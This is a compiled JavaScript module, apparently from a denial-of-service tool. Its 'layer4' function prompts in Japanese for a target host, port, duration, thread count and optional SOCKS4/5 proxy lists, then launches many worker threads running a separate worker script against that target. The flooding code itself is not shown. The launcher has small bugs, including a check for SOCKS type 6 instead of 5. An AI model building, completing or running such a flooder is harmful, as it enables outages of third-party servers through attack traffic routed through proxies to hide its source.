"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.layer4 = layer4;
const worker_threads_1 = require("worker_threads");
const prompt_sync_1 = __importDefault(require("prompt-sync"));
const prompt = (0, prompt_sync_1.default)();
const path_1 = __importDefault(require("path"));
const fs_1 = __importDefault(require("fs"));
//import functions files
const sleep_1 = require("../util/sleep");
//colors
const lightCyan = '\x1b[38;5;87m';
const white = `\u001b[0m`;
function layer4() {
    return __awaiter(this, void 0, void 0, function* () {
        let proxies = [];
        const proxySelect = prompt(`${lightCyan}proxy${white}[${lightCyan}ON${white}/${lightCyan}OFF${white}]> `);
        if (proxySelect !== "ON" && proxySelect !== "OFF") {
            console.log("requestTypeはGETかPOSTで指定してください。");
            yield (0, sleep_1.sleep)(3000);
            return;
        }
        let proxy_type_select;
        if (proxySelect === "ON") {
            proxy_type_select = parseInt(prompt(`${lightCyan}socks${white}[${lightCyan}4${white}/${lightCyan}5${white}]> `));
            if (isNaN(proxy_type_select) || proxy_type_select !== 4 && proxy_type_select !== 6) {
                console.log("typeが無効です。");
            }
            else if (proxy_type_select === 4) {
                proxies = fs_1.default.readFileSync("socks4_proxies.txt", "utf-8").split("\n");
            }
            else {
                proxies = fs_1.default.readFileSync("socks5_proxies.txt", "utf-8").split("\n");
            }
        }
        const target_host = prompt(`${lightCyan}targetHost${white}> `);
        if (!target_host.includes(".") && target_host !== "") {
            console.log("指定されたIPが無効です。");
            yield (0, sleep_1.sleep)(3000);
            return;
        }
        const target_port = parseInt(prompt(`${lightCyan}targetPort${white}> `));
        const interval = parseInt(prompt(`${lightCyan}interval${white}> `));
        const time = parseInt(prompt(`${lightCyan}time${white}> `));
        const threads = parseInt(prompt(`${lightCyan}threads${white}> `));
        if (isNaN(target_port || interval || time || threads)) {
            console.log("port, interval, time, threadsのいずれかが無効です。");
            yield (0, sleep_1.sleep)(3000);
            return;
        }
        let currentThread = 0;
        const promises = [];
        for (let i = 0; i < threads; i++) {
            promises.push(new Promise((resolve, reject) => {
                currentThread++;
                const worker = new worker_threads_1.Worker(path_1.default.resolve(__dirname, "./worker.js"), {
                    workerData: {
                        target_host,
                        target_port,
                        proxySelect,
                        proxy_type_select,
                        proxies,
                        interval,
                        time,
                        currentThread
                    }
                });
                worker.on("message", resolve);
                worker.on('error', reject);
                worker.on("exit", (code) => {
                    if (code !== 0) {
                        reject(new Error(`Worker stopped with exit code ${code}`));
                    }
                });
            }));
        }
        yield Promise.all(promises);
        process.stdin.resume();
    });
}
